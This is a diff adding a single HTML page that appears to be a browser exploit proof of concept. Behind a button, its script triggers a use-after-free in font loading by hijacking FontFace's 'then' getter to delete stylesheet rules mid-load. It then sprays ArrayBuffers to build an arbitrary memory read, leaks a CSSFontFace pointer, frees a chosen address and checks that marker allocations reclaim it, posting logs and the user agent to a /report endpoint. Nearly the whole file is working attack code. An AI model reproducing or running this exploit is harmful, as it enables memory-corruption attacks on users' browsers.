@@ -1,0 +1,63 @@
+<!doctype html><html><body style="margin:0;padding:12px;font-family:system-ui">
+<button id="go" style="font-size:22px;padding:14px 28px;border-radius:10px">FREE + RECLAIM</button>
+<pre id="o" style="white-space:pre-wrap;font:12px/1.35 ui-monospace;margin-top:10px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;lg("[1] getter");st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("FREE+RECLAIM "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return}
+ var d=u.dv,wp=d.getUint32(0x60,true),wh=d.getUint32(0x64,true);
+ var w=new Uint8Array(u.rd(wp,wh,32));
+ var fa={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0,hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+ var bb=new Uint8Array(u.rd(fa.lo,fa.hi,0x40));
+ var bk={lo:(bb[0x30]|bb[0x31]<<8|bb[0x32]<<16|bb[0x33]<<24)>>>0,hi:(bb[0x34]|bb[0x35]<<8|bb[0x36]<<16|bb[0x37]<<24)>>>0};
+ lg("[2] CSSFontFace="+hx(bk.lo,bk.hi));
+ var tgt={lo:(bk.lo+0x1000)>>>0,hi:bk.hi};
+ lg("[3] free target="+hx(tgt.lo,tgt.hi));
+ var pre=new Uint8Array(u.rd(tgt.lo,tgt.hi,16));
+ lg("[4] before: "+Array.from(pre).map(function(x){return ("0"+x.toString(16)).slice(-2)}).join(" "));
+ d.setUint32(F,tgt.lo,true);d.setUint32(F+4,tgt.hi,true);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);
+ try{u.f.featureSettings='"liga" 1';lg("[5] freed (setter returned)")}catch(e){lg("[5] threw: "+e.message)}
+ // reclaim: same-size allocations with a marker
+ var tags=[];
+ for(var i=0;i<0x40;i++){var ab=new ArrayBuffer(S);var dv=new DataView(ab);dv.setUint32(0,0xdeadbeef,true);dv.setUint32(4,0xcafebabe,true);tags.push(ab)}
+ lg("[6] sprayed "+tags.length+" x 0xB8 with DEADBEEF/CAFEBABE");
+ var post=new Uint8Array(u.rd(tgt.lo,tgt.hi,16));
+ lg("[7] after:  "+Array.from(post).map(function(x){return ("0"+x.toString(16)).slice(-2)}).join(" "));
+ var hit=false;for(var i=0;i+8<=post.length;i+=4){if(post[i]===0xef&&post[i+1]===0xbe&&post[i+2]===0xad&&post[i+3]===0xde)hit=true;}
+ lg(hit?"[8] RECLAIMED — freed slot reused by our marker":"[8] not reused yet (allocator kept it free)");
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);
+</script></body></html>
